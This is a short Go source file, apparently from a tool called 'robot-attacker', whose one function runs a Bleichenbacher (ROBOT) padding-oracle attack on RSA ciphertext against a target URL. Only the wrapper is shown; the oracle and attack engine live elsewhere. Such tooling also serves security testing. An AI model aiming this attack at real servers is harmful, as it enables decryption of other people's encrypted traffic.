package crypto

import (
	"crypto/rsa"
	"math/big"
	"robot-attacker/core"
)

// Execute full Bleichenbacher attack
func ExecuteAttack(config *core.AttackerConfig, publicKey *rsa.PublicKey, ciphertext []byte) *big.Int {
	paddingOracle := core.NewOracle(config.TargetURL(), config.OracleTimeoutMS)
	targetCiphertext := new(big.Int).SetBytes(ciphertext)
	attackerEngine := NewBleichenbacherAttacker(publicKey, paddingOracle)
	
	return attackerEngine.Run(targetCiphertext)
}
